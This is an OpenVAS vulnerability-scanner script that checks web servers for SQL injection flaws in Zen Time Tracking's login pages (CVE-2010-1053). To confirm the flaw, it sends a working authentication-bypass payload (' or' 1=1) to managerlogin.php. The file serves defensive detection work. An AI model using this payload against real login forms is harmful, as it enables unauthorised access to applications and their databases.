###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zen_time_tracking_mult_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Zen Time Tracking multiple SQL Injection vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow the attacker to view, add, modify or
  delete information in the underlying database.
  Impact Level: Application";
tag_affected = "Zen Time Tracking version 2.2 and prior";
tag_insight = "Inputs passed to 'username' and 'password' parameters in 'userlogin.php'
  and 'managerlogin.php' are not properly sanitised before using it in an sql
  query, when 'magic_quotes_gpc' is disabled.";
tag_solution = "No solution or patch is available as of 24th March, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://zentracking.com/time-tracking-download.php";
tag_summary = "The host is running Zen Time Tracking and is prone to multiple
  SQL Injection vulnerabilities.";

if(description)
{
  script_id(800748);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-04-06 08:47:09 +0200 (Tue, 06 Apr 2010)");
  script_bugtraq_id(38153);
  script_cve_id("CVE-2010-1053");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Zen Time Tracking multiple SQL Injection vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/38471");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/56146");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/11345");

  script_description(desc);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_summary("Check the version of Zen Time Tracking");
  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
zenPort = get_http_port(default:80);
if(!zenPort){
  exit(0);
}

foreach path (make_list("/", "/ZenTimeTracking", "/zentimetracking", cgi_dirs()))
{
  ## Send and recieve the response
  sndReq = http_get(item:string(path, "/index.php"), port:zenPort);
  rcvRes = http_send_recv(port:zenPort, data:sndReq);

  ## Confirm Zen Time Tracking application
  if("Zen Time Tracking" >< rcvRes)
  {
    ## Try an exploit
    filename = string(path + "/managerlogin.php");
    host = get_host_name();
    authVariables = "username=' or' 1=1&password=' or' 1=1";

    ## Construct post request
    sndReq2 = string( "POST ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: OpenVAs-Agent\r\n",
                      "Accept: text/html,application/xhtml+xml\r\n",
                      "Accept-Language: en-us,en;q=0.5\r\n",
                      "Accept-Encoding: gzip,deflate\r\n",
                      "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                      "Keep-Alive: 300\r\n",
                      "Connection: keep-alive\r\n",
                      "Referer: http://", host, filename, "\r\n",
                      "Cookie: PHPSESSID=bfc4433ae91a4bfe3f70ee900c50d39b\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                       authVariables);
    rcvRes2 = http_keepalive_send_recv(port:zenPort, data:sndReq2);

    if("Create Group" >< rcvRes2 && "Assign Group"  >< rcvRes2 &&
       "Log Off" >< rcvRes2)
    {
      security_hole(zenPort);
      exit(0);
    }
  }
}
